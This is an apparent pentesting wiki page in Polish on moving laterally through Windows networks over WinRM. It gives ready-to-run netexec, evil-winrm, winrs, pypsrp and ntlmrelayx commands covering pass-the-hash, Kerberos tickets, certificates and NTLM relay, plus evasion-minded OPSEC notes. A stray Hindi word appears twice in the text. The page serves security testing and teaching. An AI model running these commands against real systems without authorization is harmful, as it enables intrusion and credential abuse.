# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM to jeden z najwygodniejszych transportów **lateral movement** w środowiskach Windows, ponieważ daje zdalną powłokę przez **WS-Man/HTTP(S)** bez potrzeby stosowania trików z tworzeniem usług SMB. Jeśli cel wystawia **5985/5986** i Twój principal ma अनुमति do używania remoting, często możesz bardzo szybko przejść od „valid creds” do „interactive shell”.

Dla **protocol/service enumeration**, listenerów, włączania WinRM, `Invoke-Command` oraz ogólnego użycia klienta, sprawdź:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Dlaczego operatorzy lubią WinRM

- Używa **HTTP/HTTPS** zamiast SMB/RPC, więc często działa tam, gdzie wykonanie w stylu PsExec jest blokowane.
- Z **Kerberos** unika wysyłania ponownie używalnych poświadczeń do celu.
- Działa czysto z narzędzi **Windows**, **Linux** i **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Interaktywna ścieżka PowerShell remoting uruchamia na celu **`wsmprovhost.exe`** w kontekście uwierzytelnionego użytkownika, co operacyjnie różni się od exec opartego na usługach.

## Model dostępu i wymagania wstępne

W praktyce skuteczny WinRM lateral movement zależy od **trzech** rzeczy:

1. Cel ma **WinRM listener** (`5985`/`5986`) i reguły firewalla, które pozwalają na dostęp.
2. Konto może **authenticate** do endpointu.
3. Konto ma अनुमति do **open a remoting session**.

Typowe sposoby uzyskania takiego dostępu:

- **Local Administrator** na celu.
- Członkostwo w **Remote Management Users** na nowszych systemach lub **WinRMRemoteWMIUsers__** na systemach/komponentach, które nadal respektują tę grupę.
- Jawnie delegowane prawa remoting przez lokalne deskryptory bezpieczeństwa / zmiany ACL PowerShell remoting.

Jeśli już kontrolujesz maszynę z prawami admina, pamiętaj, że możesz też **delegować WinRM access bez pełnego członkostwa w grupie adminów** używając technik opisanych tutaj:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Pułapki uwierzytelniania, które mają znaczenie podczas lateral movement

- **Kerberos wymaga hostname/FQDN**. Jeśli łączysz się po IP, klient zwykle przełącza się na **NTLM/Negotiate**.
- W przypadkach **workgroup** lub na granicy zaufania między domenami, NTLM zwykle wymaga albo **HTTPS**, albo dodania celu do **TrustedHosts** po stronie klienta.
- W przypadku **local accounts** przez Negotiate w workgroup, zdalne ograniczenia UAC mogą blokować dostęp, chyba że użyte jest wbudowane konto Administratora albo `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting domyślnie używa SPN **`HTTP/<host>`**. W środowiskach, gdzie `HTTP/<host>` jest już zarejestrowany dla innego konta usługi, Kerberos dla WinRM może zakończyć się błędem `0x80090322`; użyj SPN z portem albo przełącz się na **`WSMAN/<host>`**, jeśli taki SPN istnieje.

Jeśli zdobędziesz valid credentials podczas password spraying, ich walidacja przez WinRM często jest najszybszym sposobem sprawdzenia, czy dają shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec do walidacji i jednorazowego wykonania
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM do interaktywnych shelli

`evil-winrm` pozostaje najwygodniejszą interaktywną opcją z Linuxa, ponieważ obsługuje **passwords**, **NT hashes**, **Kerberos tickets**, **client certificates**, transfer plików oraz ładowanie PowerShell/.NET w pamięci.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN edge case: `HTTP` vs `WSMAN`

Gdy domyślny **`HTTP/<host>`** SPN powoduje błędy Kerberos, spróbuj zamiast tego poprosić o/używać ticket **`WSMAN/<host>`**. Zdarza się to w utwardzonych lub nietypowych środowiskach enterprise, gdzie **`HTTP/<host>`** jest już przypisany do innego konta usługi.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
To jest również przydatne po nadużyciu **RBCD / S4U**, gdy konkretnie sfałszowałeś lub zażądałeś biletu usługi **WSMAN** zamiast generycznego biletu `HTTP`.

### Uwierzytelnianie oparte na certyfikacie

WinRM obsługuje także **uwierzytelnianie certyfikatem klienta**, ale certyfikat musi być zmapowany na celu do **local account**. Z ofensywnego punktu widzenia ma to znaczenie, gdy:

- ukradłeś/wyeksportowałeś prawidłowy certyfikat klienta i klucz prywatny już zmapowane dla WinRM;
- nadużyłeś **AD CS / Pass-the-Certificate** do uzyskania certyfikatu dla principal, a następnie przeszedłeś do innej ścieżki uwierzytelniania;
- działasz w środowiskach, które celowo unikają zdalnego dostępu opartego na hasłach.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM jest znacznie mniej powszechne niż uwierzytelnianie hasłem/hash/Kerberos, ale gdy istnieje, może zapewnić ścieżkę **passwordless lateral movement**, która przetrwa rotację hasła.

### Python / automatyzacja z `pypsrp`

Jeśli potrzebujesz automatyzacji zamiast shell operatora, `pypsrp` daje Ci WinRM/PSRP z Pythona z obsługą **NTLM**, **certificate auth**, **Kerberos** i **CredSSP**.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
Jeśli potrzebujesz dokładniejszej kontroli niż oferuje wysokopoziomowy wrapper `Client`, niższy poziom `WSMan` + `RunspacePool` APIs jest przydatny dla dwóch częstych problemów operatora:

- wymuszenie **`WSMAN`** jako usługi/SPN Kerberos zamiast domyślnego oczekiwania `HTTP` używanego przez wiele klientów PowerShell;
- połączenie z **niestandardowym PSRP endpoint** takim jak **JEA** / custom session configuration zamiast `Microsoft.PowerShell`.
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### Niestandardowe punkty końcowe PSRP i JEA mają znaczenie podczas lateral movement

Udane uwierzytelnienie WinRM **nie** zawsze oznacza, że trafisz do domyślnego, nieograniczonego punktu końcowego `Microsoft.PowerShell`. Dojrzałe środowiska mogą udostępniać **niestandardowe konfiguracje sesji** lub punkty końcowe **JEA** z własnymi ACL i zachowaniem run-as.

Jeśli masz już code execution na hoście Windows i chcesz zrozumieć, jakie surface remoting istnieją, wylicz zarejestrowane punkty końcowe:
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
Gdy istnieje użyteczny endpoint, kieruj się bezpośrednio do niego zamiast do domyślnej shell:
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
Praktyczne implikacje ofensywne:

- **Ograniczony** endpoint nadal może wystarczyć do lateral movement, jeśli udostępnia dokładnie te cmdlets/functions, które są potrzebne do kontroli usług, dostępu do plików, tworzenia procesów lub arbitralnego wykonania .NET / zewnętrznych komend.
- **Źle skonfigurowany JEA** role jest szczególnie wartościowy, gdy udostępnia niebezpieczne komendy, takie jak `Start-Process`, szerokie wildcardy, zapisywalne providery lub niestandardowe proxy functions, które pozwalają obejść zamierzone ograniczenia.
- Endpointy oparte na **RunAs virtual accounts** lub **gMSAs** zmieniają efektywny security context uruchamianych komend. W szczególności endpoint oparty na gMSA może zapewnić **network identity on the second hop** nawet wtedy, gdy zwykła sesja WinRM napotka klasyczny problem delegacji.

## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` jest wbudowany i przydatny, gdy chcesz **natywne wykonanie komend przez WinRM** bez otwierania interaktywnej sesji PowerShell remoting:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Dwie flagi łatwo zapomnieć, a w praktyce mają znaczenie:

- `/noprofile` jest często wymagane, gdy zdalny principal **nie** jest lokalnym administratorem.
- `/allowdelegate` pozwala zdalnej powłoce używać twoich poświadczeń wobec **trzeciego hosta** (na przykład, gdy polecenie potrzebuje `\\fileserver\share`).
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
Operacyjnie, `winrs.exe` często skutkuje zdalnym łańcuchem procesów podobnym do:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Warto to zapamiętać, ponieważ różni się to od service-based exec oraz od interaktywnych sesji PSRP.

### `winrm.cmd` / WS-Man COM zamiast PowerShell remoting

Możesz też wykonywać polecenia przez **WinRM transport** bez `Enter-PSSession`, wywołując klasy WMI przez WS-Man. To utrzymuje transport jako WinRM, podczas gdy zdalny mechanizm wykonania staje się **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
To podejście jest przydatne, gdy:

- Logowanie PowerShell jest intensywnie monitorowane.
- Chcesz **WinRM transport**, ale nie klasyczny workflow z PS remoting.
- Tworzysz lub używasz własnych narzędzi opartych na obiekcie COM **`WSMan.Automation`**.

## NTLM relay to WinRM (WS-Man)

Gdy SMB relay jest blokowany przez signing, a LDAP relay jest ograniczony, **WS-Man/WinRM** może nadal być atrakcyjnym celem relay. Nowoczesny `ntlmrelayx.py` zawiera **WinRM relay servers** i może relayować do celów **`wsman://`** lub **`winrms://`**.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Dwie praktyczne uwagi:

- Relay jest najbardziej użyteczny, gdy cel akceptuje **NTLM** i relayed principal ma uprawnienia do używania WinRM.
- Nowszy kod Impacket obsługuje konkretnie żądania **`WSMANIDENTIFY: unauthenticated`**, więc sondy w stylu `Test-WSMan` nie psują flow relay.

Dla ograniczeń multi-hop po uzyskaniu pierwszej sesji WinRM sprawdź:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Uwagi OPSEC i detekcji

- **Interaktywne PowerShell remoting** zwykle tworzy **`wsmprovhost.exe`** na celu.
- **`winrs.exe`** zwykle tworzy **`winrshost.exe`**, a potem żądany proces potomny.
- Niestandardowe endpointy **JEA** mogą wykonywać akcje jako wirtualne konta **`WinRM_VA_*`** albo jako skonfigurowany **gMSA**, co zmienia zarówno telemetry, jak i zachowanie second-hop w porównaniu ze zwykłą powłoką w kontekście użytkownika.
- Spodziewaj się telemetry **network logon**, eventów usługi WinRM oraz logowania PowerShell operational/script-block, jeśli używasz PSRP zamiast surowego `cmd.exe`.
- Jeśli potrzebujesz tylko jednej komendy, `winrs.exe` albo jednorazowe wykonanie WinRM może być mniej głośne niż długotrwała interaktywna sesja remoting.
- Jeśli Kerberos jest dostępny, preferuj **FQDN + Kerberos** zamiast IP + NTLM, aby zmniejszyć zarówno problemy z zaufaniem, jak i niezręczne zmiany `TrustedHosts` po stronie klienta.

## Referencje

- [Microsoft: JEA Security Considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [pypsrp README](https://github.com/jborean93/pypsrp)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
